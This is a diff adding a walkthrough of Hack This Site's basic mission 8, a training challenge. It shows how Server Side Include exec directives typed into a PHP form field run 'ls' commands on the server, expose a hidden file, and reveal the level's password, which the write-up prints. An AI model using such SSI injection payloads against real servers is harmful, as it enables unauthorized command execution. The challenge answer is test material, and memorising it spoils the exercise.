@@ -1,0 +1,44 @@
+https://www.hackthissite.org/missions/basic/8/
+
+Description:
+  The password is yet again hidden in an unknown file. Sam's daughter has begun learning PHP, and has a small script to demonstrate her knowledge. 
+  Requirements: Knowledge of SSI (dynamic html executed by the server, rather than the browser)
+  
+  Sam remains confident that an obscured password file is still the best idea, but he screwed up with the calendar program. Sam has saved the 
+  unencrypted password file in /var/www/hackthissite.org/html/missions/basic/8/
+  
+  However, Sam's young daughter Stephanie has just learned to program in PHP. She's talented for her age, but she knows nothing about security. 
+  She recently learned about saving files, and she wrote a script to demonstrate her ability.
+
+
+Solution:
+  Entering my name into the daughter's field returns a page with the following information:
+  
+    Hi, w3bguy!
+    
+    Your name contains 6 characters.
+  
+  So this script writes my name and runs a count function on it, at least.  Since we know that the PHP should run commands without security issues,
+  we can try an SSI attack.  First let's see if we can show the current directory contents by entering:
+    <!--#exec cmd="ls" -->
+  
+  This returns a file with the following information:
+  
+    Hi, tshngmww.shtml hipykpqu.shtml ztxdhjxn.shtml avpfeoie.shtml fviqpmaw.shtml kqbybdzc.shtml dzrnmzgx.shtml npcsygfl.shtml whqxxojt.shtml ylomcmvu.shtml 
+    uhdppswp.shtml gzntiicx.shtml dzwbqiuu.shtml qvzuieng.shtml smcerykh.shtml qjhnmhmq.shtml znodwztr.shtml!
+    
+    Your name contains 254 characters.
+  
+  We know this attack will work,but we are showing data from the https://www.hackthissite.org/missions/basic/8/tmp directory.  So we just need to list the
+  contents of that directory's parent, instead.  We can do that by running the following command:
+    <!--#exec cmd="ls ../" -->
+    
+  This returns the following information:
+  
+    Hi, au12ha39vc.php index.php level8.php tmp!
+
+    Your name contains 39 characters.
+  
+  Now we have the filename: au12ha39vc.php.  Loading that page returns the password: 3f243552
+
+  REturn to the main page and enter the password.
